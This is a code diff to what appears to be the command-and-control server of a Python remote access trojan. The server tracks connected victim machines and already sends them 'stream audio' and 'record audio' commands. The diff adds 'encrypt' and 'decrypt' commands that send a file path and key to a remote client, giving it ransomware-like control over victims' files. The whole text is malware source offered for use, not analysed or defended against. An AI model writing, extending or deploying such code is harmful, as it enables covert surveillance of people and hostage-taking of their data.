@@ -82,6 +82,27 @@ def record_audio(client_socket):
     client_socket.send(time.encode())
 
 
+def encrypt(client_socket):
+    path = str(input('Enter file or directory: '))
+    key = input('Enter key: ')
+    client_socket.send(path.encode())
+    client_socket.send(key.encode())
+
+
+def decrypt(client_socket):
+    path = str(input('Enter file or directory: '))
+    key = input('Enter key: ')
+    client_socket.send(path.encode())
+    client_socket.send(key.encode())
+
+
+'''
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+main function || main function || main function || main function || main function
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+'''
+
+
 def audit_of_all_connected_clients():
     del_key = []
     for key, value in clients_dict.items():
@@ -141,6 +162,13 @@ def socket_accept():
     clients_dict[count] = [client_socket, client_address]
 
 
+'''
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+control module || control module || control module || control module || control module
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+'''
+
+
 def client_management():
     # Providing access to clients.
     while True:
@@ -176,6 +204,10 @@ def send_commands(client_socket, client_address):
             stream_audio(client_socket)
         elif command.lower() == 'record audio':
             record_audio(client_socket)
+        elif command.lower() == 'encrypt':
+            encrypt(client_socket)
+        elif command.lower() == 'decrypt':
+            decrypt(client_socket)
 
         results = client_socket.recv(BUFFER_SIZE).decode()
         print(results)
